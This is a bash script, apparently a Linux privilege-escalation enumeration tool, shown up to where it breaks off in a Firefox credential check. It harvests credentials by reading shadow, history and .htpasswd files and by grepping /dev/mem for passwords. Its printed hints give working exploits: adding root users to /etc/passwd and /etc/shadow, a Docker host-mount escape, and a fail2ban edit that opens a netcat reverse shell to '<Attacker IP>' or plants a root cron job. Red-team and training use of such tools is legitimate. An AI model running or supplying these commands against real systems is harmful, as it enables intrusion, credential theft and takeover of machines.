#!/bin/bash


#------------------> Color Code:
RED="\033[01;31m"
BLUE="\033[36m"
GREEN="\033[01;32m"
GRAY="\e[0;37m"
YELLOW='\e[1;93m'
XX="\033[0m" #--- COLSE COLOR
#------------------> Clear Screen:
echo -e "\n\n${RED}╚════{ Clearing Terminal${XX}"
sleep 0.5
clear 
echo -e "\n\n${GREEN}╚════{ Loading Script...${XX}"
sleep 2
clear
#------------------> Banner:
echo -e "\n"
echo -e "\n"
echo -e "
                ▄▄▄▄▄▄▄▄▄▄▄▄
              ████████████████
            ███████████████████
          ▐██████████████████████           
            ▀▀▀▀████████████▀▀▀▀             ██████╗███╗   ███╗ █████╗  ██████╗██╗  ██╗     ██████╗      ██████╗  █████╗  █████╗ ████████╗
      ▄▄▄██                      ██▄▄▄      ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║     ╚════██╗     ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝ 
  ██████████▄▄▄▄▄▄        ▄▄▄▄▄▄██████████  ╚█████╗ ██╔████╔██║███████║╚█████╗ ███████║       ███╔═╝     ██████╔╝██║  ██║██║  ██║   ██║
        ▀▀▀██████████████████████▀▀▀         ╚═══██╗██║╚██╔╝██║██╔══██║ ╚═══██╗██╔══██║     ██╔══╝       ██╔══██╗██║  ██║██║  ██║   ██║
                                            ██████╔╝██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║     ███████╗     ██║  ██║╚█████╔╝╚█████╔╝   ██║
           █                  █             ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚══════╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝    ╚═╝
            █    ██▀▀▀▀██    █              ═════════════════════════════════════════════════════════{Privilege Escalation Script v3.0}
             █  ▀        ▀  █
              ██▄████████▄██
                ▀████████▀
                   ████
"
sleep 1
echo -e "\n${BLUE}Nᴏᴛᴇ:${XX}"
echo -e "\tTʜɪs sᴄʀɪᴘᴛ ɪs ᴏɴᴇ ᴏғ ᴘʀᴏᴊᴇᴄᴛHULK sᴄʀɪᴘᴛs, ɪᴛ ʜᴀs ʙᴇᴇɴ ᴅᴇsɪɢɴᴇᴅ ᴛᴏ sᴜᴘᴘᴏʀᴛ (SOC & Rᴇᴅ Tᴇᴀᴍ)"
echo -e "\tᴏʀ ɪᴛ  ᴄᴀɴ ʙᴇ ᴜsᴇ ғᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ  ᴘᴜʀᴘᴏsᴇs ɪɴ ғɪɴᴅɪɴɢ sʏsᴛᴇᴍ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛɪᴇs ᴛʜᴀᴛ ᴍᴀʏ ʟᴇᴀᴅ"
echo -e "\tᴛᴏ ᴘʀɪᴠɪʟᴇɢᴇ  ᴇsᴄᴀʟᴀᴛɪᴏɴ & ᴇxᴘʟᴏɪᴛᴇ ɪᴛ. Tʜᴇ sᴄʀɪᴘᴛ sʜᴏᴜʟᴅ ʙᴇ ᴜsᴇᴅ  ɪɴ sᴀғᴇ ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ. Tʜᴇ"
echo -e "\tᴀᴜᴛʜᴏʀ ɪs ɴᴏᴛ  ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴀɴʏ ᴍɪsᴜsᴇ ᴏғ ɪᴛ. ᴛʜᴇʀᴇғᴏʀ ʙʏ ʀᴇᴀᴅɪɴɢ ᴛʜɪs, ʏᴏᴜ ᴛᴀᴋᴇ ғᴜʟʟ"
echo -e "\tʀᴇsᴘᴏɴsɪʙɪʟɪᴛʏ ᴏғ ᴍɪsᴜsɪɴɢ ɪᴛ."
sleep 1
echo -e "\n${BLUE}Aᴜᴛʜᴏʀ:${XX}"
sleep 0.1
echo -e "\t     Iʀᴏɴ Hᴜʟᴋ"
echo -e "\tMᴀɴ Iɴ A Bʟᴀᴄᴋ Tᴜxᴇᴅᴏ"  
sleep 0.1
echo -e "\n${BLUE}Tᴡᴇᴇᴛ Mᴇ:${XX}"
sleep 0.1
echo -e "\tɪʀᴏɴʜᴜʟᴋ_x69"
sleep 0.1
echo -e "\n${BLUE}Mᴇssᴀɢᴇ:${XX}"
sleep 0.1
echo -e "\tAʟʟ ᴛʜᴇ ᴇxᴘʟᴏɪᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʟɪsᴛᴇᴅ ʙᴀsᴇᴅ ᴏɴ ᴛʜᴇ ᴀᴜᴛʜᴏʀ's ᴏᴘɪɴɪᴏɴ, ʏᴏᴜ ᴍᴀʏ ᴜsᴇ ᴀɴʏ ᴏғ ʏᴏᴜʀ ᴄʜᴏɪᴄᴇ. Rᴇᴍᴇᴍᴇʙʀ, SKY HAS NO LIMITS :)"
sleep 0.1
echo -e "\n${BLUE}Rᴇᴄᴏᴍᴍᴇɴᴅᴀᴛɪᴏɴ:${XX}"
sleep 0.1
echo -e "\tFᴏʀ ᴀ ʙᴇᴛᴛᴇʀ ᴠɪᴇᴡ ᴏғ ᴛʜᴇ ʀᴇᴘᴏʀᴛ ɪs ɪᴛ ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ ʀᴇᴅɪʀᴇᴄᴛɪɴɢ ᴛʜᴇ ᴏᴜᴛᴘᴜᴛ ᴛᴏ ᴀ ғɪʟᴇ: ./ᴘʀᴏᴊᴇᴄᴛHULK.sh > PE_ʀᴇᴘᴏʀᴛ.ᴛxᴛ"
echo -e "\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ ᴀɴᴅ ᴛʀʏ ᴛᴏ ᴜsᴇ ᴍᴀɴʏ ᴛᴏᴏʟs ᴀs ᴍᴜᴄʜ ᴀs ʏᴏᴜ ᴄᴀɴ."
sleep 0.1
echo -e "\n${BLUE}Sᴄᴀɴ Sᴛᴀʀᴛᴇᴅ Aᴛ:${XX}"
echo -e "\t"; date
sleep 5
echo -e "\n\n${RED}\t\tEnumeration on progress ╔═..................................(1%)......................................${XX}\n"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ════════════════════════════════════════[ Current User Information ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
sleep 1
echo -e "\n${BLUE}╔═════{ Current Privilege is?${XX}"
    root () { [ "$(id -u)" -eq 0 ]; }
    if root;
        then
            echo -e "     ${GREEN}You are Root!${XX}"
            sleep 2
        else
            echo -e "\tNormal User, too bad :(... " >&2
            echo -e "\tTry hard to escalate :D "
            sleep 2
    fi
echo -e "\n${BLUE}╔═════{ Current user is:${XX}"
    whoami | grep -i $USER 
echo -e "\n${BLUE}╔═════{ Sudo privileged access:${XX}"
    sudo -ln | grep -E --color=always 'NOPASSWD|ALL|$'
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Incase you have the password, run: sudo -l and find a way to exploit the file.                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Who's logged in:${XX}"
    w
echo -e "\n${BLUE}╔═════{ Login History:${XX}"
    last -Faiw | last | grep still --color=always
echo -e "\n${BLUE}╔═════{ Last Log In:${XX}"
    lastlog | grep -v "**Never logged in**" 
echo -e "\n${BLUE}╔═════{ Root Users:${XX}"
    awk -F: '($3 == '0') {print}' /etc/passwd | grep root --color=always
echo -e "\n${BLUE}╔═════{ Users with console:${XX}"
    cat /etc/passwd | grep --color=always '/bin/bash\|/bin/sh\|/bin/zsh'
echo -e "\n${BLUE}╔═════{ Total number of users:${XX}"
    getent passwd | wc -l
echo -e "\n${BLUE}╔═════{ Can we read other user's history files?${XX}"
    find / -iname *.*history* -print 2>/dev/null | xargs ls -la
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Have a look at history files, they might have sensitive information.                                                ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Are we in a restricted shell?${XX}"
    env | grep -i "rbash\|chroot"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Bypass Restricted Shell:                                                                                            ║"
        echo -e "\t║    https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/                                             ║"
        echo -e "\t║    https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf                           ║"
        echo -e "\t║If non of the above worked, try:                                                                                    ║"
        echo -e "\t║    echo '$'PATH                                                                                                    ║"
        echo -e "\t║    ls the directory and find an exploit                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ which users have recently used sudo:${XX}"
    if [ -r /var/log/auth.log ];
        then
            cat /var/log/auth.log
        else
            echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ User ID:${XX}"
    id
echo -e "\n${BLUE}╔═════{ User Groups:${XX}"
    groups
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc,Docker, Wheel, Shadow, Disk, Video, etc.   ║"
        echo -e "\t║Every group worths Googling for exploit.                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Are we in Docker:${XX}"
    find / -iname *.dockerenv -type f 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Escape the Docker container: Run fdisk -l to make sure wich drive to mount                                          ║"
        echo -e "\t║    mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd                                                               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ User ID & Groups possible escap:${XX}"
    id | grep --color=always -i "docker\|lxd\|auth\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow\|fail2ban" 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Docker:                                                                                                             ║"
        echo -e "\t║Run:                                                                                                                ║"
        echo -e "\t║    1) docker image ls                                                                                              ║"
        echo -e "\t║    2) docker run -v /:/mnt --rm -it <Image_Name> chroot /mnt sh                                                    ║"
        echo -e "\t║https://gtfobins.github.io/gtfobins/docker/                                                                         ║"
        echo -e "\t║https://www.hackingarticles.in/docker-privilege-escalation/                                                         ║"
        echo -e "\t║https://fosterelli.co/privilege-escalation-via-docker.html                                                          ║"
        echo -e "\t║https://medium.com/@anushibin007/ha-chakravyuh-vulnhub-walkthrough-2be29373722a                                     ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║LXD/LXC:                                                                                                            ║"
        echo -e "\t║https://www.hackingarticles.in/lxd-privilege-escalation/                                                            ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                              ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation    ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Samashare:                                                                                                          ║"
        echo -e "\t║https://www.securityfocus.com/bid/9619/exploit                                                                      ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║lpadmin:                                                                                                            ║"
        echo -e "\t║Members of lpadmin can read /var/run/cups/certs/0. With this key it is possible to access the cups web interface as ║"
        echo -e "\t║admin. You can edit the cups config file and set the page log to any filename you want (for example /etc/shadow).   ║"
        echo -e "\t║Then you can read the file contents by viewing the cups page log. By printing you can also write some random data   ║"
        echo -e "\t║to the given file.                                                                                                  ║"
        echo -e "\t║Exploit:                                                                                                            ║"
        echo -e "\t║https://www.exploit-db.com/exploits/43418                                                                           ║"
        echo -e "\t║Read More:                                                                                                          ║"
        echo -e "\t║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                            ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║sudo/admin:                                                                                                         ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Video:                                                                                                              ║"
        echo -e "\t║The video group can be used locally to give a set of users access to a video device or to the screen output.        ║"
        echo -e "\t║This could be exploit d by taking a screenshot of the current screen output and gathering any private information   ║"
        echo -e "\t║such as user passwords or hashes.                                                                                   ║"
        echo -e "\t║Esc from video:-                                                                                                    ║"
        echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Disk:                                                                                                               ║"
        echo -e "\t║The disk group provides users with access to the raw data contained in disks and partitions.                        ║"
        echo -e "\t║Esc from disk:-                                                                                                     ║"
        echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Shadow:                                                                                                             ║"
        echo -e "\t║Since users in this group have access to view the /etc/shadow file, this can be exploit d by cracking password      ║"
        echo -e "\t║hashes found in it.                                                                                                 ║"
        echo -e "\t║Esc from shadow:-                                                                                                   ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Adm:                                                                                                                ║"
        echo -e "\t║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D        ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║fial2ban:                                                                                                           ║"
        echo -e "\t║File2Ban Enumeration:                                                                                               ║"
        echo -e "\t║    ls -l /etc/fail2ban/                                                                                            ║"
        echo -e "\t║    cat /etc/fail2ban/README.fox                                                                                    ║"
        echo -e "\t║    ls -l /etc/fail2ban/action.d (Do we have write permissions)                                                     ║"
        echo -e "\t║Reverse Shell: ** PUT SED COMMAND IN ONE LINE **                                                                    ║"
        echo -e "\t║    which nc bash sh                                                                                                ║"
        echo -e "\t║Way1)                                                                                                               ║"
        echo -e "\t║    sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc <Attacker IP> 443 -e     ║"
        echo -e "\t║    /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf                                                 ║"
        echo -e "\t║Way2) create a cron job as root:                                                                                    ║"
        echo -e "\t║    sed -i 's:actionban = nc <Attacker IP> 443 -e /usr/bin/bash:actionban = echo '*  *  *  *  * root nc             ║"
        echo -e "\t║    <Attacker IP> 443 -e /usr/bin/bash' >> /etc/crontab:g' /etc/fail2ban/action.d/iptables-multiport.conf           ║"
        echo -e "\t║https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7   ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║auth:                                                                                                               ║"
        echo -e "\t║https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ══════════════════════════════════[ Password File Permission & Users ]══════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell>                                       ║"
        echo -e "\t║If an -x- is representing the password field, this indicates that the password is encrypted.                        ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Password file:${XX}"
    ls -la /etc/passwd --color=always
echo -e "\n${BLUE}    ══{ Is Password file Writable?${XX}"
    passwd=/etc/passwd
    [ $# -eq 0 ]
        if [ -w "$passwd" ] 
        then
        echo -e "${GREEN}	Permission is Granted${XX}"
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
                echo -e "\t║${RED}First, generate a password with one of the following commands:${XX}                                                      ║"
                echo -e "\t║    ${RED}openssl passwd -1 -salt hulk password${XX}                                                                           ║"
                echo -e "\t║    ${RED}perl -le 'print crypt(hulk, password)'${XX}                                                                          ║"
                echo -e "\t║${RED}Rewrite the password file:${XX}                                                                                          ║"
                echo -e "\t║    ${RED}echo 'hulk:HASH:0:0::/root:/bin/bash' >> /etc/passwd${XX}                                                            ║"
                echo -e "\t║${RED}Then do: su hulk${XX}                                                                                                    ║"
                echo -e "\t║Read more:                                                                                                          ║"
                echo -e "\t║    https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/                                ║"
                echo -e "\t║Protect the file by limiting the access to it:                                                                      ║"
                echo -e "\t║    chmod 644 /etc/passwd                                                                                           ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
        echo -e "${RED}	Permission Denied${XX}"
        fi
echo -e "\n${BLUE}    ══{ Reading Password File:${XX}"
    if [ -r /etc/passwd ];
    then
        cat /etc/passwd | grep -E ":0:0:|$"
    else
        echo -e "${RED}	Permission Denied${XX}"
    fi
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║All linux systems will print this information, our aim is to find hash value to be cracked or write permission to   ║"
        echo -e "\t║missuse it.                                                                                                         ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Hash in Password file:${XX}"
    grep  -v 'x' /etc/passwd
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If any hash is found in the /etc/passwd, the attacker my try to crack it by using any hash cracker software or tool ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Shadow file:${XX}"
    ls -la /etc/shadow --color=always
echo -e "\n${BLUE}    ══{ Is Shadow file Writable?${XX}"
    shadow=/etc/shadow
    [ $# -eq 0 ]
        if [ -w "$shadow" ] 
            then
                echo -e "${GREEN}	Permission is Granted${XX}"
                        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
                        echo -e "\t║1) Generate a new Shadow Hash and replace it with the current root hash:                                            ║"
                        echo -e "\t║    - mkpasswd  -m sha-512 -S prove123 -s                                                                           ║"
                        echo -e "\t║2) Open the shadow file using any text editor of your choice:                                                       ║"
                        echo -e "\t║    or copy your HASH from your system and replace it with the root hash                                            ║"
                        echo -e "\t║3) Login to root using your password                                                                                ║"
                        echo -e "\t║4) Or Simply do:                                                                                                    ║"
                        echo -e "\t║    echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/shadow                                          ║"
                        echo -e "\t║    This adds a root privilege user 'privesc' with the password 'password'                                          ║"
                        echo -e "\t║Read More:                                                                                                          ║"
                        echo -e "\t║    https://linuxize.com/post/etc-shadow-file/                                                                      ║"
                        echo -e "\t║    https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html                              ║"
                        echo -e "\t║Protect the file by limiting the access to it:                                                                      ║"
                        echo -e "\t║    chmod 600 /etc/shadow                                                                                           ║"
                        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            else
                echo -e "${RED}	Permission Denied${XX}"
            fi
echo -e "\n${BLUE}    ══{ Reading shadow File:${XX}"
    if [ -r /etc/shadow ];
    then
        cat /etc/shadow
        echo -e "\n${BLUE}    ══{ Hash in Shadow file: (Interesting :D)${XX}"
            grep  -v '*:\|!:' /etc/shadow
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║Crack the hash using online website or any cracking tools or run this on the target machine:                        ║"
            echo -e "\t║    ${RED}unshadow /etc/passwd /etc/shadow > shadow.john${XX}                                                                  ║"
            echo -e "\t║    ${RED}john shadow.john --wordlist=<WORLD_LIST>${XX}                                                                        ║"
            echo -e "\t║You may also crack the hash by copying the hash or shadow.john file to your OS and do:                              ║"
            echo -e "\t║    ${RED}john –wordlist=<WORLD_LIST> hash${XX}                                                                                ║"
            echo -e "\t║If you own the system and have root, you can use MimiPenguin to crack it:                                           ║"
            echo -e "\t║    https://github.com/huntergregal/mimipenguin                                                                     ║"
            echo -e "\t║    https://github.com/sevagas/swap_digger                                                                          ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    else
        echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Sudoers File:${XX}"
    ls -la /etc/sudoers --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                                ║"
        echo -e "\t║Read more:                                                                                                          ║"
        echo -e "\t║    https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Is Sudoers file Writable?${XX}"
    sudoers=/etc/sudoers
    [ $# -eq 0 ]
        if [ -w "$sudoers" ] 
            then
                echo -e "${GREEN}   Permission is Granted${XX}"
            else
                echo -e "${RED}	Permission Denied${XX}"
            fi
echo -e "\n${BLUE}    ══{ Reading Sudoers File:${XX}"
    if [ -r /etc/sudoers ];
        then
            cat /etc/sudoers | grep -E --color=always 'ALL|$'
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║The sudo command allows non root users to run commands that would normally require super user privileges. If the    ║"
                echo -e "\t║running file or the application has a global vulnerability or file permission misconfiguration, the attacker may    ║"
                echo -e "\t║google the vulnerability or abuse the file for user escalation.                                                     ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
        echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ User Group list:${XX}"
    ls -la /etc/group --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║It stores group information or defines the user groups i.e. it defines the groups to which users belong.            ║"
        echo -e "\t║Read more:                                                                                                          ║"
        echo -e "\t║  https://www.cyberciti.biz/faq/understanding-etcgroup-file/                                                        ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Content of User Group list:${XX}"
    cat /etc/group 
echo -e "\n${BLUE}╔═════{ Password Policy:${XX}"
    grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Read more:                                                                                                          ║"
        echo -e "\t║  https://www.linuxfordevices.com/tutorials/linux/linux-password-policies                                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═══════════════════════════════════════[ Credentials Harvesting ]═══════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║To list all files having the word password/credentials/hash do the following manually:                              ║"
        echo -e "\t║${RED}grep -rn -i 'pass\|cred\|hash' / --color=always > password.txt${XX}                                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Find 'Pass, Hash, Cred' as a file name:${XX}"
    find / -iname "*pass*" -o -iname "*hash*" -o -iname "*cred*" 2> /dev/null | xargs ls -ld 2> /dev/null --color=always | grep -v "/usr/\|/var/\|/opt/\|/sys/"
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Excluded: /usr/ | /var/ | /opt/ | /sys/                                                                             ║"
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ User Bash History:${XX}"
    find / -iname *_history -xdev 2>/dev/null | xargs ls -ld
        if [ -f /home/$USER/.bash_history ]; 
            then
                echo -e "\n${BLUE}    ══{ Reading User Bash History:${XX}"
                cat /home/$USER/.bash_history
            else
                echo -e "  ${RED}File does not exist${XX}"
        fi
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Bash and other scripting languages, along with various services often store previous commands run in the system,    ║"
        echo -e  '\t║which could contain clear-text or encoded passwords if they are hard-coded in the command itself                    ║'
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ /etc/security/opasswd file permission:${XX}"
    ls -la /etc/security/opasswd
echo -e "\n${BLUE}╔═════{ Reading old passwords in /etc/security/opasswd:${XX}"
    if [ -r /etc/security/opasswd ];
        then
            cat /etc/security/opasswd
                echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e  "\t║The /etc/security/opasswd file is used by pam_cracklib (a module used in Linux to ensure a good password policy is  ║"
                echo -e  '\t║in place) to store the hashed version of old passwords used on the system to prevent users from reusing the same    ║'
                echo -e  '\t║over and over again.                                                                                                ║'
                echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            else
        echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ In memory passwords:${XX}"
    strings /dev/mem -n10 | grep -i PASS 2>/dev/null
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Services will sometimes store the credentials entered by the end user in clear text in memory. The commands below   ║"
        echo -e  '\t║can help find credentials stored in processes                                                                       ║'
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Password Files:${XX}"
    find / -iname passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Read the following files, they might have password or hash in them.                                                 ║"
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ WiFi Creds:${XX}"
    ls -la /etc/NetworkManager/system-connections 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║There is a file for each connection with its configuration, also you need root privileges to read. However, the     ║"
        echo -e "\t║password isn't encrypted.                                                                                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Sensitive files:${XX}"
    ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║See if any listed files have weak file permission                                                                   ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ htpasswd:${XX}"
    find / -iname .htpasswd -print -exec cat {} \; 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║It is a flat-file used to store usernames and password. This file is generally used by the web server software like ║"
        echo -e "\t║Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are in ASCII text format.The    ║"
        echo -e "\t║hash maybe cracked using online tools or any cracking password tools.                                               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Firefox credentials:${XX}"
    if [ -f "/home/$USER/.mozilla/firefox 2>/dev/null" ]; 
        then
            ls -la /home/$USER/.mozilla/firefox 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Password files are:                                                                                                 ║"
